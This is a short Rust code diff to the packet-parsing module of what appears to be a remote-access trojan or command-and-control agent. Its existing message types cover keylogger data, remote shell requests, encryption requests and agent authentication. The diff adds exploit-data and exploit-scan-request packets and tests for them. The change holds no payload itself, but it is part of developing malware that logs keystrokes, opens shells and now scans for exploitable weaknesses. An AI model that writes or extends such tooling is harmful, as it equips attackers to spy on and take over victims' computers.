@@ -1,9 +1,9 @@
 use thiserror::Error;
 
 use super::{
-    AgentAuth, AgentAuthResponse, AgentControl, EncryptionRequest, EncryptionResponse, Heartbeat,
-    KeyloggerData, KeyloggerRequest, ShellCwd, ShellRequest, StreamClose, StreamData, StreamError,
-    StreamOpen, SystemInfo,
+    AgentAuth, AgentAuthResponse, AgentControl, EncryptionRequest, EncryptionResponse,
+    ExploitData, ExploitScanRequest, Heartbeat, KeyloggerData, KeyloggerRequest, ShellCwd,
+    ShellRequest, StreamClose, StreamData, StreamError, StreamOpen, SystemInfo,
 };
 
 #[derive(Debug)]
@@ -23,6 +23,8 @@ pub enum Packets {
     KeyloggerRequest(KeyloggerRequest),
     KeyloggerData(KeyloggerData),
     ShellCwd(ShellCwd),
+    ExploitData(ExploitData),
+    ExploitScanRequest(ExploitScanRequest),
 }
 
 #[derive(Error, Debug)]
@@ -82,6 +84,10 @@ pub fn from_packet_bytes(data: &[u8]) -> Result<Packets, PacketError> {
         )?)),
         0x0E => Ok(Packets::KeyloggerData(KeyloggerData::deserialize(data)?)),
         0x0F => Ok(Packets::ShellCwd(ShellCwd::deserialize(data)?)),
+        0x10 => Ok(Packets::ExploitData(ExploitData::deserialize(data)?)),
+        0x11 => Ok(Packets::ExploitScanRequest(ExploitScanRequest::deserialize(
+            data,
+        )?)),
         _ => Err(PacketError::UnknownPacket(packet_code.to_string())),
     }
 }
@@ -199,6 +205,20 @@ mod tests {
         let pkt = KeyloggerData::new(vec![0x41]);
         let bytes = to_wire(&pkt);
         assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::KeyloggerData(_))));
+    }
+
+    #[test]
+    fn from_packet_bytes_exploit_data() {
+        let pkt = ExploitData::new(vec![]);
+        let bytes = to_wire(&pkt);
+        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::ExploitData(_))));
+    }
+
+    #[test]
+    fn from_packet_bytes_exploit_scan_request() {
+        let pkt = ExploitScanRequest::full();
+        let bytes = to_wire(&pkt);
+        assert!(matches!(from_packet_bytes(&bytes), Ok(Packets::ExploitScanRequest(_))));
     }
 
     #[test]
